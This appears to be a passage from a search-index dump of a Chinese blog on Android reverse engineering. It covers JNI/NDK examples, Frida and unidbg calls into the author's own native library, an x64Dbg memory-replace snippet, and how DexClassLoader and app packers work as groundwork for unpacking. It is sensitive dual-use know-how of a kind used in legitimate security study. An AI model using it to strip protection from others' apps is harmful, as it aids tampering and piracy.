env-\u003eNewStringUTF(hello.c_str()); } extern \"C\" JNIEXPORT jint JNICALL Java_com_example_luodst_MainActivity_LuoAdd(JNIEnv *env, jobject thiz, jint n1, jint n2) { return n1 + n2; } extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luodst_MainActivity_mdString(JNIEnv *env, jclass clazz, jstring string) { const char *szString = env-\u003eGetStringUTFChars(string, NULL); std::string strMd5 = MD5(szString).toStr(); return env-\u003eNewStringUTF(strMd5.c_str()); } 开始调用 下述代码,用来示例抽取原Apk的so库,用Frida直接来调用其中的方法. function main(){ Java.perform(function(){ var module_luomd5 = Module.load(\"/data/app/libluodst.so\"); var mdString_address = module_luomd5.findExportByName(\"Java_com_example_luodst_MainActivity_mdString\"); console.log(\"mdString_address: \", mdString_address) var mdString = new NativeFunction(mdString_address, \"pointer\", [\"pointer\", \"pointer\", \"pointer\"]); var env = Java.vm.getEnv(); //mdString是个静态Native函数 var result = mdString(env, NULL, env.newStringUtf(\"Hello XiaLuoHun!\")) console.log(\"result: \", env.getStringUtfChars(result, NULL).readCString()) }) } setImmediate(main); frida -U com.android.settings -l .\\LuoHook.js ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:5:1","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"unidbg unidbg是一个基于unicorn的逆向工具,可以直接调用Android和iOS中的so文件. https://github.com/zhkl0228/unidbg 测试 将Unidbg整个项目下载下来,用IDEA打开,运行其中一个测试项目,若能正常输出,则配置正确. 调用so中的静态方法 准备一个so文件 Java层 package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.text.TextUtils; import android.widget.TextView; import com.example.luodst.databinding.ActivityMainBinding; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; public class MainActivity extends AppCompatActivity { // Used to load the 'luodst' library on application startup. static { System.loadLibrary(\"luodst\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; String strSample = \"Hello XiaLuoHun!\"; tv.setText(\"mdString: \" + mdString(strSample)); } public static native String mdString(String string); } Native层 #include \u003cjni.h\u003e#include \u003cstring\u003e #include \"md5.h\" extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luodst_MainActivity_mdString(JNIEnv *env, jclass clazz, jstring string) { const char *szString = env-\u003eGetStringUTFChars(string, NULL); std::string strMd5 = MD5(szString).toStr(); return env-\u003eNewStringUTF(strMd5.c_str()); } 开始调用 将上述so文件放到资源目录下,新建一个类开始写代码. package com.example.luodst; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.arm.backend.DynarmicFactory; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject; import com.github.unidbg.memory.Memory; import java.io.File; public class MainActivity extends AbstractJni { public static void main(String[] args) { long start = System.currentTimeMillis(); MainActivity mainActivity = new MainActivity(); System.out.println(\"load offset=\" + (System.currentTimeMillis() - start) + \"ms\"); mainActivity.crack(); } private final AndroidEmulator emulator; private final VM vm; private final DvmClass dvmClass; private MainActivity() { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for32Bit() .addBackendFactory(new DynarmicFactory(true)) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(); //5.是否打印日志 vm.setVerbose(false); //6.设置jni vm.setJni(this); //7.加载目标so文件 DalvikModule dm = vm.loadLibrary(new File(\"unidbg-android/src/test/resources/example_binaries/armeabi-v7a/libluodst.so\"), false); //8.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); //9.配置Native方法类名 dvmClass = vm.resolveClass(\"com/example/luodst/MainActivity\"); } private void crack() { //10.执行JNI方法 //示例 DvmObject result1 = dvmClass.callStaticJniMethodObject(emulator, \"mdString(Ljava/lang/String;)Ljava/lang/String;\", \"Hello XiaLuoHun!\"); System.out.println(\"result1 =\u003e \" + result1.getValue()); } } 调用so中的实例方法-无java方法 so中的Native层无Java方法调用. 准备一个so文件 Java层 package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.text.TextUtils; import android.widget.TextView; import com.example.luodst.databinding.ActivityMainBinding; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; public class MainActivity extends AppCompatActivity { // Used to load the 'luodst' library on application startup. static { System.loadLibrary(\"luodst\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:5:2","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"反射 ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:6:0","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"参考链接 https://www.jianshu.com/p/9be58ee20dee https://www.jianshu.com/p/67081d9b0a9c Java高级特性-反射.mhtml JNI的常用方法的中文API.mhtml ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:6:1","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"从源码中学习 https://github.com/GravityBox/GravityBox ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:6:2","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"示例 Java层 package com.example.luomd5; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.text.TextUtils; import android.widget.TextView; import com.example.luomd5.databinding.ActivityMainBinding; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; public class MainActivity extends AppCompatActivity { // Used to load the 'luomd5' library on application startup. static { System.loadLibrary(\"luomd5\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; String strSample = \"XiaLuoHun\"; String str = \"mdString: \" + mdString(strSample) + \"\\n\" + \"Javamd5: \" + Javamd5(strSample) + \"\\n\" + \"Refmd5: \" + Refmd5(strSample) + \"\\n\" + \"Refmd5Sec: \" + Refmd5Sec(strSample); tv.setText(str); } public String Javamd5(String string) { if (TextUtils.isEmpty(string)) { return \"\"; } MessageDigest md5 = null; try { md5 = MessageDigest.getInstance(\"MD5\"); byte[] bytes = md5.digest(string.getBytes()); StringBuilder result = new StringBuilder(); for (byte b : bytes) { String temp = Integer.toHexString(b \u0026 0xff); if (temp.length() == 1) { temp = \"0\" + temp; } result.append(temp); } return result.toString(); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); } return \"\"; } public static native String mdString(String string); public native String Refmd5(String string); public native String Refmd5Sec(String string); } Native层 #include \u003cjni.h\u003e#include \u003cstring\u003e #include \"md5.h\" __attribute__ ((visibility(\"hidden\"))) jstring JNICALL LuoDynamicNative(JNIEnv *env, jobject /* this */) { std::string hello = \"Hello from C++ LuoHun\"; return env-\u003eNewStringUTF(hello.c_str()); } extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luomd5_MainActivity_mdString(JNIEnv *env, jclass clazz, jstring string) { const char *szString = env-\u003eGetStringUTFChars(string, NULL); std::string strMd5 = MD5(szString).toStr(); return env-\u003eNewStringUTF(strMd5.c_str()); } extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luomd5_MainActivity_Refmd5(JNIEnv *env, jobject thiz, jstring string) { //md5 = MessageDigest.getInstance(\"MD5\"); jclass clsMessageDigest = env-\u003eFindClass(\"java/security/MessageDigest\"); jmethodID getInstance = env-\u003eGetStaticMethodID(clsMessageDigest, \"getInstance\", \"(Ljava/lang/String;)Ljava/security/MessageDigest;\"); jstring strMD5 = env-\u003eNewStringUTF(\"MD5\"); jobject objMD5 = env-\u003eCallStaticObjectMethod(clsMessageDigest, getInstance, strMD5); //byte[] bytes = md5.digest(string.getBytes()); jclass clsString = env-\u003eFindClass(\"java/lang/String\"); jmethodID getBytes = env-\u003eGetMethodID(clsString, \"getBytes\", \"()[B\"); jbyteArray jbAry = (jbyteArray) env-\u003eCallObjectMethod(string, getBytes); jmethodID digest = env-\u003eGetMethodID(clsMessageDigest, \"digest\", \"([B)[B\"); jbyteArray jbAryResult = (jbyteArray) env-\u003eCallObjectMethod(objMD5, digest, jbAry); char *cmd5 = reinterpret_cast\u003cchar *\u003e(env-\u003eGetByteArrayElements(jbAryResult, 0)); int i; char dest[32] = {0}; for (i = 0; i \u003c 16; i++) { sprintf(dest + i * 2, \"%02x\", (unsigned int) cmd5[i]); } return env-\u003eNewStringUTF(dest); } extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luomd5_MainActivity_Refmd5Sec(JNIEnv *env, jobject thiz, jstring string) { jclass clsMainActivity = env-\u003eFindClass(\"com/example/luomd5/MainActivity\"); jmethodID Javamd5 = env-\u003eGetMethodID(clsMainActivity, \"Javamd5\", \"(Ljava/lang/String;)Ljava/lang/String;\"); jstring strMd5 = (jstring) env-\u003eCallObjectMethod(thiz, Javamd5, string); return strMd5; } LuoMd5_反射.7z ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:6:3","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"OnCreate函数Native化 ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:7:0","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"Java层 package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.view.LayoutInflater; import android.view.View; import android.widget.TextView; import com.example.luodst.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luodst' library on application startup. static { System.loadLibrary(\"luodst\"); } private ActivityMainBinding binding; /* @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); }*/ protected native void onCreate(Bundle savedInstanceState); /** * A native method that is implemented by the 'luodst' native library, * which is packaged with this application. */ public native String stringFromJNI(); } ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:7:1","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"Native层 #include \u003cjni.h\u003e#include \u003cstring\u003e extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luodst_MainActivity_stringFromJNI( JNIEnv *env, jobject /* this */) { std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } extern \"C\" JNIEXPORT void JNICALL Java_com_example_luodst_MainActivity_onCreate(JNIEnv *env, jobject thiz, jobject saved_instance_state) { //super.onCreate(savedInstanceState); //方式一 jclass clsAppCompatActivity1 = env-\u003eFindClass(\"androidx/appcompat/app/AppCompatActivity\"); //方式二 jclass clsMainActivity = env-\u003eGetObjectClass(thiz); jclass clsAppCompatActivity2 = env-\u003eGetSuperclass(clsMainActivity); jmethodID onCreate = env-\u003eGetMethodID(clsAppCompatActivity1, \"onCreate\", \"(Landroid/os/Bundle;)V\"); //调用父类方法 env-\u003eCallNonvirtualVoidMethod(thiz, clsAppCompatActivity1, onCreate, saved_instance_state); //binding = ActivityMainBinding.inflate(getLayoutInflater()); jmethodID getLayoutInflater = env-\u003eGetMethodID(clsMainActivity, \"getLayoutInflater\", \"()Landroid/view/LayoutInflater;\"); jclass clsActivityMainBinding = env-\u003eFindClass( \"com/example/luodst/databinding/ActivityMainBinding\"); jmethodID inflate = env-\u003eGetStaticMethodID(clsActivityMainBinding, \"inflate\", \"(Landroid/view/LayoutInflater;)Lcom/example/luodst/databinding/ActivityMainBinding;\"); jobject jbinding = env-\u003eCallStaticObjectMethod(clsActivityMainBinding, inflate, env-\u003eCallObjectMethod(thiz, getLayoutInflater)); //setContentView(binding.getRoot()); jmethodID getRoot = env-\u003eGetMethodID(clsActivityMainBinding, \"getRoot\", \"()Landroid/view/View;\"); jmethodID setContentView = env-\u003eGetMethodID(clsMainActivity, \"setContentView\", \"(Landroid/view/View;)V\"); env-\u003eCallVoidMethod(thiz, setContentView, env-\u003eCallObjectMethod(jbinding, getRoot)); //TextView tv = binding.sampleText; jfieldID sampleText = env-\u003eGetFieldID(clsActivityMainBinding, \"sampleText\", \"Landroid/widget/TextView;\"); jobject tv = env-\u003eGetObjectField(jbinding, sampleText); //tv.setText(stringFromJNI()); jclass clsTextView = env-\u003eFindClass(\"android/widget/TextView\"); jmethodID setText = env-\u003eGetMethodID(clsTextView, \"setText\", \"(Ljava/lang/CharSequence;)V\"); jmethodID stringFromJNI = env-\u003eGetMethodID(clsMainActivity, \"stringFromJNI\", \"()Ljava/lang/String;\"); env-\u003eCallVoidMethod(tv, setText, env-\u003eCallObjectMethod(thiz, stringFromJNI)); } ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:7:2","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"源代码 LuoDstOnCreate函数Native化.7z ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:7:3","tags":["NDK"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["x64Dbg"],"content":"x64Dbg之SearchAndReplaceMem 在编写x64Dbg插件时用到以下两个函数,有坑! SCRIPT_EXPORT duint FindMem(duint start, duint size, const char* pattern); SCRIPT_EXPORT bool SearchAndReplaceMem(duint start, duint size, const char* searchpattern, const char* replacepattern); 首先SearchAndReplaceMem只会在start开始的size大小范围内只替换一次,所以要结合FindMem来完成全部的替换. 当FindMem查找的地址范围过大时,第二次查找会失败(示例中的Size为0x0000000040000000),出现下述错误. 正确的写法如下: DWORD WINAPI workThreadProc(_In_ LPVOID lpParameter) { duint dSelDisasmAddr = Script::Gui::Disassembly::SelectionGetStart(); duint dSelBase = Script::Memory::GetBase(dSelDisasmAddr); duint dSelSize = Script::Memory::GetSize(dSelDisasmAddr); char searchpattern[] = \"48656C6C6F205869614C756F48756E2100\"; char replacepattern[] = \"48656C6C6F20576F726C642100\"; duint nSearchpatternLen = strlen(searchpattern) + 1; duint dStartAddr = dSelBase; do { duint dAddr = Script::Pattern::FindMem(dStartAddr, dSelSize + dSelBase - dStartAddr, searchpattern); if (dAddr == -1 || dAddr == 0) { break; } dStartAddr = dAddr + 1; if (!Script::Pattern::SearchAndReplaceMem(dAddr, nSearchpatternLen, searchpattern, replacepattern)) { break; } Sleep(10); } while (true); ::MessageBox(NULL, \"Done\", \"replaceMemory\", MB_OK); return 0; } ","date":"2021-12-27","objectID":"/posts/x64dbg/x64dbg%E4%B9%8Bsearchandreplacemem/:0:0","tags":["x64Dbg"],"title":"x64Dbg之SearchAndReplaceMem","uri":"/posts/x64dbg/x64dbg%E4%B9%8Bsearchandreplacemem/"},{"categories":["Android基础"],"content":"App加壳和脱壳 目前市场上不加壳的App很少见,可以说要想完成对一个App的逆向分析,脱壳是第一步! ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:0:0","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"ClassLoader ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:1:0","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"JVM的类加载器 三种类加载器 Bootstrap ClassLoader(引导类加载器) C/C++代码实现的加载器,用于加载指定JDK的核心类库,比如java.lang、java.uti等这些系统类.Java虚拟机的启动就是通过Bootstrap,该ClassLoader在java里无法获取,负责加载/lib下的类. Extensions ClassLoader(拓展类加载器) Java中的实现类为ExtClassLoader,提供除了系统类之外的额外功能,可以在java里获取,负责加载/lib/ext下的类. Application ClassLoader(应用程序类加载器) Java中的实现类为AppClassLoader,是与我们接触最多的类加载器,开发人员写的代码默认就是由它来加载,ClassLoader.getSystemClassLoader返回的就是它. 继承关系 可以自定义类加载器,只需要通过继承java.lang.ClassLoader类的方式来实现自己的类加载器即可. 双亲委派 双亲委派模式的工作原理:如果一个类加载器收到了类加载请求,它并不会自己先去加载,而是把这个请求委托给父类的加载器去执行,如果父类加载器还存在其父类加载器,则进一步向上委托,依次递归,请求最终将到达顶层的启动类加载器,如果父类加载器可以完成类加载任务,就成功返回,倘若父类加载器无法完成此加载任务,子加载器才会尝试自己去加载,这就是双亲委派模式.即每个儿子都不愿意干活,每次有活都丢给父亲去干,直到父亲说这件事我也干不了时,儿子自己想办法去完成,这个就是双亲委派. 优点 避免重复加载,如果已经加载过一次Class,可以直接读取已经加载的Class. 更加安全,无法自定义类来替代系统的类,可以防止核心API库被随意篡改. 类加载时机 隐式加载 创建类的实例. 访问类的静态变量,或者为静态变量赋值. 调用类的静态方法. 使用反射方式来强制创建某个类或接口对应的java.lang.Class对象. 初始化某个类的子类. 显式加载 使用LoadClass()加载. 使用forName()加载. 类装载流程 装载,查找和导入Class文件. 链接,其中解析步骤是可以选择的. 检查,检查载入的class文件数据的正确性. 准备,给类的静态变量分配存储空间. 解析,将符号引用转成直接引用. 初始化,即调用函数,对静态变量,静态代码块执行初始化工作. ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:1:1","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"Android的类加载器 继承关系 上图为Android系统中的ClassLoader的继承关系图,其中InMemoryDexClassLoader为Android8.0新引入的ClassLoader ClassLoader 为抽象类. BootClassLoader 预加载常用类,单例模式.与Java中的BootClassLoader不同,它并不是由C/C++代码实现,而是由Java实现的. BaseDexClassLoader 是InMemoryDexClassLoader、PathClassLoader、DexClassLoader的父类.类加载的主要逻辑都是在BaseDexClassLoader完成的. SecureClassLoader 继承了抽象类ClassLoader,扩展了ClassLoader类加入了权限方面的功能,加强了安全性,其子类URLClassLoader是用URL路径从jar文件中加载类和资源. InMemoryDexClassLoader Android8.0新引入的,可以直接从内存中加载dex. PathClassLoader 是Android默认使用的类加载器,一个apk中的Activity等类便是在其中加载. DexClassLoader 可以加载任意目录下的dex/jar/apk/zip文件,比PathClassLoader更灵活,是实现插件化、热修复以及dex加壳的重点. 源码分析 每个ClassLoader在构造时都会传一个父ClassLoader,遵循双亲委派机制.下图以PathClassLoader为例. 代码验证 本次主要验证Activity是否由PathClassLoader加载,以及双亲委派机制. package org.example.luoclassloader; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; public class MainActivity extends AppCompatActivity { private final String TAG = \"[LuoHun] \"; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); tstClassLoader(); } void tstClassLoader() { ClassLoader thisClassLoader = MainActivity.class.getClassLoader(); Log.d(TAG, \"app: \" + thisClassLoader); ClassLoader parentClassLoader = thisClassLoader.getParent(); while (parentClassLoader != null) { Log.d(TAG, \"this: \" + thisClassLoader + \" --\u003eparent: \" + parentClassLoader); thisClassLoader = parentClassLoader; parentClassLoader = thisClassLoader.getParent(); } Log.d(TAG, \"root: \" + thisClassLoader); } } 上述代码输出结果如下: app : dalvik.system.PathClassLoader this: dalvik.system.PathClassLoader --\u003eparent: java.lang.BootClassLoader root: java.lang.BootClassLoader ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:1:2","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"动态加载示例 本次主要使用DexClassLoader,实现一个简单的动态加载Dex文件,并调用其中的某个方法. 用As建立一个空工程,新建一个类,写一个测试方法. package org.example.luodst; import android.util.Log; public class LuoTst { private final String TAG = \"[LuoHun] \"; public void fun1() { Log.d(TAG, \"org.example.luodst.fun1\"); } } 编译上述工程,从apk中提取出Dex文件,传到手机的临时目录中. adb push classes.dex /data/local/tmp 用As建立另一个工程,来加载上述Dex文件,并调用上述的测试函数fun1. package org.example.luoloaddex; import androidx.appcompat.app.AppCompatActivity; import android.content.Context; import android.os.Bundle; import android.widget.TextView; import java.io.File; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import dalvik.system.DexClassLoader; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Context appContext = getApplicationContext(); //org.example.luodst.LuoTst tstDexClassLoader(appContext, \"/data/local/tmp/classes.dex\"); } public void tstDexClassLoader(Context context, String strDexFilePath) { File optFile = context.getDir(\"opt_dex\", 0); File libFile = context.getDir(\"lib_dex\", 0); /* 参数一: String dexPath, Dex文件路径 参数二: String optimizedDirectory, Dex优化目录 Android中内存中不会出现上述参数一的Dex文件, 会先优化,然后运行,优化后为.odex文件 参数三: String librarySearchPath, 库搜索路径,jni有so文件 参数四: ClassLoader parent, 类加载器 * */ DexClassLoader dexClassLoader = new DexClassLoader(strDexFilePath, optFile.getAbsolutePath(), libFile.getAbsolutePath(), MainActivity.class.getClassLoader()); Class\u003c?\u003e clazz = null; try { clazz = dexClassLoader.loadClass(\"org.example.luodst.LuoTst\"); if (clazz != null) { try { Object obj = clazz.newInstance(); Method func1Method = clazz.getDeclaredMethod(\"fun1\"); func1Method.invoke(obj); } catch (InvocationTargetException e) { e.printStackTrace(); } catch (NoSuchMethodException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InstantiationException e) { e.printStackTrace(); } } } catch (ClassNotFoundException e) { e.printStackTrace(); } } } ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:2:0","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"加壳App运行流程 ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:3:0","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"App启动流程 通过Zygote进程到最终进入到app进程世界，我们可以看到ActivityThread.main()是进入App世界的大门. 下面列出ActivityThread这个类中比较重要的成员和字段. public final class ActivityThread { //保存创建的ActivityThread实例. private static volatile ActivityThread sCurrentActivityThread; //LoadedApk中有mClassLoader成员,即PathClassLoader,App运行过程中用于加载相关四大组件类的ClassLoader final ArrayMap\u003cString, WeakReference\u003cLoadedApk\u003e\u003e mPackages = new ArrayMap\u003c\u003e(); //用于获取当前虚拟机创建的ActivityThread实例. public static ActivityThread currentActivityThread() { return sCurrentActivityThread; } //--- } ActivityThread.main()函数是java中的入口main函数,这里会启动主消息循环,并创建ActivityThread实例,之后调用thread.attach(false)完成一系列初始化准备工作,并完成全局静态变量sCurrentActivityThread的初始化.之后主线程进入消息循环,等待接收来自系统的消息.当收到系统发送来的bindapplication的进程间调用时,调用函数handlebindapplication来处理该请求. private void handleBindApplication(AppBindData data) { //step 1: 创建LoadedApk对象 data.info = getPackageInfoNoCheck(data.appInfo, data.compatInfo); ... //step 2: 创建ContextImpl对象; final ContextImpl appContext = ContextImpl.createAppContext(this, data.info); //step 3: 创建Instrumentation mInstrumentation = new Instrumentation(); //step 4: 创建Application对象;在makeApplication函数中调用了newApplication，在该函数中又调用了app.attach(context)，在attach函数中调用了Application.attachBaseContext函数 Application app = data.info.makeApplication(data.restrictedBackupMode, null); mInitialApplication = app; //step 5: 安装providers List\u003cProviderInfo\u003e providers = data.providers; installContentProviders(app, providers); //step 6: 执行Application.Create回调 mInstrumentation.callApplicationOnCreate(app); 在handleBindApplication函数中第一次进入了app的代码世界,该函数功能是启动一个application,并把系统收集的apk组件等相关信息绑定到application里,在创建完application对象后,接着调用了application的attachBaseContext方法,之后调用了application的onCreate函数.由此可以发现,app的Application类中的attachBaseContext和onCreate这两个函数是最先获取执行权进行代码执行的.这也是为什么各家的加固工具的主要逻辑都是通过替换app入口Application,并自实现这两个函数,在这两个函数中进行代码的脱壳以及执行权交付的原因. ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:3:1","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"App运行流程 ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:3:2","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"加壳应用的运行流程 当壳在函数attachBaseContext和onCreate中执行完加密的Dex文件的解密后,通过自定义的ClassLoader在内存中加载解密后的Dex文件.为了解决后续应用在加载执行解密后的dex文件中的Class和Method的问题,接下来就是通过利用java的反射修复一系列的变量.其中最为重要的一个变量就是应用运行中的ClassLoader,只有ClassLoader被修正后,应用才能够正常的加载并调用Dex中的类和方法,否则的话由于ClassLoader的双亲委派机制,最终会报ClassNotFound异常,应用崩溃退出,这是加固厂商不愿意看到的.由此可见ClassLoader是一个至关重要的变量,所有应用中加载的Dex文件最终都在应用的ClassLoader中. 因此,只要获取到加固应用最终通过反射设置后的ClassLoader,我们就可以通过一系列反射最终获取到当前应用所加载的解密后的内存中的Dex文件. ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:3:3","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"参考链接 https://bbs.pediy.com/thread-252630.htm [APP的启动过程][https://shuwoom.com/?p=142] [实战开发APK安全加固][https://shuwoom.com/?p=360] APP的启动过程.mhtml 实战开发APK安全加固.mhtml 